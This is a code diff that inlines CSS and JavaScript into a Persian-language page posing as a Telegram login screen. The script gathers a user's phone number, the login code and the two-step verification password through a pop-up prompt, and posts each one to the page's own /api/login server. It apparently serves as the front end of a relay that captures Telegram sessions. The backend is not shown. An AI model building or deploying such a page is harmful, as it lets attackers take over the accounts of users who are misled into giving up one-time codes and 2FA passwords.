@@ -4,7 +4,166 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ورود به تلگرام</title>
-  <link rel="stylesheet" href="style.css" />
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 20px;
+      background: linear-gradient(135deg, #0088cc, #00a2ff);
+      color: #333;
+      direction: rtl;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 400px;
+      width: 90%;
+      margin: 20px auto;
+      padding: 30px;
+      background-color: white;
+      border-radius: 15px;
+      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      color: #0088cc;
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+
+    p {
+      color: #666;
+      margin-bottom: 25px;
+      font-size: 14px;
+    }
+
+    .input-group {
+      margin: 20px 0;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input {
+      padding: 14px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      text-align: center;
+      transition: border-color 0.3s;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #0088cc;
+      box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
+    }
+
+    button {
+      padding: 14px 20px;
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      transition: background-color 0.3s, transform 0.2s;
+    }
+
+    button:hover {
+      background-color: #006da3;
+      transform: translateY(-2px);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .status {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 8px;
+      min-height: 20px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .status.info {
+      background-color: #e3f2fd;
+      border-left: 4px solid #2196f3;
+      color: #0d47a1;
+    }
+
+    .status.success {
+      background-color: #e8f5e9;
+      border-left: 4px solid #4caf50;
+      color: #2e7d32;
+    }
+
+    .status.error {
+      background-color: #ffebee;
+      border-left: 4px solid #f44336;
+      color: #c62828;
+    }
+
+    .status.loading {
+      background-color: #fff3e0;
+      border-left: 4px solid #ff9800;
+      color: #e65100;
+    }
+
+    .status.loading::after {
+      content: "...";
+      animation: dots 1.5s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0%, 20% { content: "."; }
+      40% { content: ".."; }
+      60%, 100% { content: "..."; }
+    }
+
+    /* حالت پاسخگویی برای موبایل */
+    @media (max-width: 480px) {
+      .container {
+        padding: 20px;
+        margin: 10px;
+      }
+      
+      h1 {
+        font-size: 20px;
+      }
+      
+      input, button {
+        padding: 12px;
+      }
+    }
+  </style>
 </head>
 <body>
   <div class="container">
@@ -31,6 +190,177 @@
 
     <div id="status" class="status">لطفاً شماره تلفن خود را وارد کنید</div>
   </div>
-  <script src="script.js"></script>
+
+  <script>
+    // script.js
+    let phoneCodeHash = ''; // برای ذخیره hash کد
+    let currentPhone = ''; // برای ذخیره شماره تلفن
+
+    document.getElementById("sendPhone").onclick = async () => {
+      const phone = document.getElementById("phone").value;
+      if (!phone) {
+        showStatus("لطفاً شماره تلفن را وارد کنید", "error");
+        return;
+      }
+
+      // اعتبارسنجی شماره تلفن
+      if (!isValidPhoneNumber(phone)) {
+        showStatus("لطفاً شماره تلفن معتبر وارد کنید (مثال: +989123456789)", "error");
+        return;
+      }
+
+      currentPhone = phone;
+      showStatus("در حال ارسال کد...", "loading");
+      
+      try {
+        const res = await fetch("/api/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ step: "sendCode", phone })
+        });
+        
+        const data = await res.json();
+        
+        if (data.success) {
+          showStatus(data.message, "success");
+          phoneCodeHash = data.phoneCodeHash; // ذخیره hash برای مرحله بعد
+          document.getElementById("codeSection").style.display = "block";
+        } else {
+          showStatus(data.message, "error");
+        }
+      } catch (error) {
+        showStatus("خطا در ارتباط با سرور", "error");
+        console.error(error);
+      }
+    };
+
+    document.getElementById("sendCode").onclick = async () => {
+      const code = document.getElementById("code").value;
+      
+      if (!code) {
+        showStatus("لطفاً کد تأیید را وارد کنید", "error");
+        return;
+      }
+
+      showStatus("در حال تأیید کد...", "loading");
+      
+      try {
+        const res = await fetch("/api/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            step: "verifyCode", 
+            phone: currentPhone, 
+            code,
+            phoneCodeHash 
+          })
+        });
+        
+        const data = await res.json();
+        
+        if (data.success) {
+          showStatus(data.message, "success");
+          document.getElementById("codeSection").style.display = "none";
+          
+          // ریدایرکت بعد از ورود موفق
+          setTimeout(() => {
+            showStatus("شما با موفقیت وارد شدید! در حال انتقال...", "success");
+          }, 2000);
+        } else if (data.needPassword) {
+          showStatus(data.message, "info");
+          // اگر نیاز به رمز دومرحله‌ای باشد
+          setTimeout(() => {
+            const password = prompt("لطفاً رمز دومرحله‌ای خود را وارد کنید:");
+            if (password) {
+              checkPassword(password);
+            }
+          }, 1000);
+        } else {
+          showStatus(data.message, "error");
+        }
+      } catch (error) {
+        showStatus("خطا در ارتباط با سرور", "error");
+        console.error(error);
+      }
+    };
+
+    // تابع برای بررسی رمز دومرحله‌ای
+    async function checkPassword(password) {
+      showStatus("در حال بررسی رمز...", "loading");
+      
+      try {
+        const res = await fetch("/api/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            step: "checkPassword", 
+            phone: currentPhone, 
+            password 
+          })
+        });
+        
+        const data = await res.json();
+        
+        if (data.success) {
+          showStatus(data.message, "success");
+          document.getElementById("codeSection").style.display = "none";
+          
+          // ریدایرکت بعد از ورود موفق
+          setTimeout(() => {
+            showStatus("شما با موفقیت وارد شدید! در حال انتقال...", "success");
+          }, 2000);
+        } else {
+          showStatus(data.message, "error");
+        }
+      } catch (error) {
+        showStatus("خطا در ارتباط با سرور", "error");
+        console.error(error);
+      }
+    }
+
+    // تابع برای نمایش وضعیت با استایل‌های مختلف
+    function showStatus(message, type = "info") {
+      const statusElement = document.getElementById("status");
+      statusElement.textContent = message;
+      statusElement.className = "status";
+      
+      switch (type) {
+        case "error":
+          statusElement.classList.add("error");
+          break;
+        case "success":
+          statusElement.classList.add("success");
+          break;
+        case "loading":
+          statusElement.classList.add("loading");
+          break;
+        case "info":
+        default:
+          statusElement.classList.add("info");
+          break;
+      }
+    }
+
+    // تابع برای اعتبارسنجی شماره تلفن
+    function isValidPhoneNumber(phone) {
+      const regex = /^\+[1-9]\d{1,14}$/;
+      return regex.test(phone);
+    }
+
+    // فعال کردن دکمه با کلید Enter
+    document.getElementById("phone").addEventListener("keypress", function(event) {
+      if (event.key === "Enter") {
+        event.preventDefault();
+        document.getElementById("sendPhone").click();
+      }
+    });
+
+    document.getElementById("code").addEventListener("keypress", function(event) {
+      if (event.key === "Enter") {
+        event.preventDefault();
+        document.getElementById("sendCode").click();
+      }
+    });
+  </script>
 </body>
 </html>
